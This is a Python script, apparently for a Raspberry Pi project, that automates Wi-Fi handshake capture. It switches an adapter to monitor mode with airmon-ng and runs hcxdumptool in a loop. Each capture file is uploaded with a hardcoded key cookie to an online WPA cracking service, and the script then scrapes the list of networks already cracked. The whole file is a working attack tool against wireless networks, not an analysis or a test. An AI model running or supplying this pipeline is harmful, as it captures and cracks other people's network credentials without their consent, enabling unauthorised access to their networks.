import subprocess
import time
import requests
import json
import os
from bs4 import BeautifulSoup


def get_interface():
    get_adapter = """airmon-ng | awk '{ if ($4 == "Ralink") print $2 }' """
    p = subprocess.Popen(get_adapter, stdout=subprocess.PIPE, shell=True)
    (output, err) = p.communicate()
    interface = output.decode('utf-8').replace('\n', '')

    set_monitor = "airmon-ng start " + interface
    subprocess.Popen(set_monitor, stdout=subprocess.PIPE, shell=True)
    time.sleep(2)

    get_monitor_interface = """airmon-ng | awk '{ if ($4 == "Ralink") print $2 }' """
    p = subprocess.Popen(get_monitor_interface, stdout=subprocess.PIPE, shell=True)
    (output, err) = p.communicate()
    interface = output.decode('utf-8').replace('\n', '')
    return interface


interface = get_interface()

while True:
    whitelist = open("/home/rumen/WiFinder/rpi_setup/whitelist.txt", "a+")
    whitelist.write('00:0F:00:77:53:85' + '\n')
    whitelist.close()

    if os.path.exists("/home/rumen/WiFinder/rpi_setup/capture.cap"):
        os.remove("/home/rumen/WiFinder/rpi_setup/capture.cap")

    hcxCommand = "hcxdumptool -i" + interface + " -o /home/rumen/WiFinder/rpi_setup/capture.cap" \
                " --filterlist=/home/rumen/WiFinder/rpi_setup/whitelist.txt --filtermode=1"
    process = subprocess.Popen(hcxCommand.split(), stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)

    print('sup')
    time.sleep(60)
    process.kill()
    time.sleep(5)
    os.remove("/home/rumen/WiFinder/rpi_setup/whitelist.txt")

    cookie = {'key': '7fcb3ff5176fb532124b5ac3e4616a04'}
    file = '/home/rumen/WiFinder/rpi_setup/capture.cap'
    url = 'https://wpa-sec.stanev.org/?submit'
    files = {'file': open(file, 'rb')}

    r = requests.post(url, files=files, cookies=cookie)
    print(r.content)

    url = 'https://wpa-sec.stanev.org/?my_nets'
    r = requests.get(url, cookies=cookie)
    soup = BeautifulSoup(r.text, features="html.parser")
    table = soup.find_all('table')
    table_data = [[cell.text for cell in row("td")]
                  for row in table]

    table_data = table_data[0]

    data = [table_data[x:x+6] for x in range(0, len(table_data), 6)]

    whitelist = open("/home/rumen/WiFinder/rpi_setup/whitelist.txt", "a+")

    result = json.loads(json.dumps(data))
    for network in result:
        whitelist.write(network[0])
        print(network[0])

    whitelist.close()

